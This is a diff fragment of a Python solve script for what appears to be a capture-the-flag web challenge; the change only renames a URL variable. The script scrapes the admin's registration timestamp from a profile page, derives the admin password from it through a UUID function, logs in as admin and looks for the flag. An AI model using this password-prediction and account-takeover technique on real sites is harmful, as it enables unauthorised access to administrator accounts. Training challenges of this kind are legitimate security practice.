@@ -21,14 +21,14 @@ def generate_uuid(timestamp_str):
         print(f"Ошибка: {e}")
         return "Ошибка: время (timestamp)."
 
-URL = "http://TASK_URL"
+TASK_URL = "http://TASK_URL"
 
-admin_page_profile = requests.get(f'{URL}/profile/1')
+admin_page_profile = requests.get(f'{TASK_URL}/profile/1')
 time_stamp = admin_page_profile.text.split('Дата регистрации на форуме:')[1].split('На главную')[0]
 time_stamp = time_stamp.split('> ')[1].split('<')[0]
 password = generate_uuid(time_stamp)
 
-request = requests.post(f"{URL}/login", data={"username":"admin", "password":f"{password}"})
+request = requests.post(f"{TASK_URL}/login", data={"username":"admin", "password":f"{password}"})
 response = request.text
 if "Уникальный идентификатор:</strong> 1" in response:
     if "CODEBY{" in response:
